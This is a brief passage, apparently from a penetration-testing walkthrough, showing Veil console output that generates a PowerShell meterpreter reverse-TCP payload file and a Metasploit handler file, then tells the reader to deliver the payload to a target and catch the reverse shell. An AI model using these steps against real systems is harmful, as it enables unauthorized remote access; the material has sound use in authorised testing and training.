 [>] Please enter the base name for output files (default is payload):
...
 [*] Language: powershell
 [*] Payload Module: powershell/meterpreter/rev_tcp
 [*] PowerShell doesn't compile, so you just get text :)
 [*] Source code written to: /var/lib/veil/output/source/payload.bat
 [*] Metasploit Resource file written to: /var/lib/veil/output/handlers/payload.rc
```

Deliver payload.bat as required to the target. Setup Metasploit manually or utilise the rc to use the preloaded options to catch the staged reverse shell.
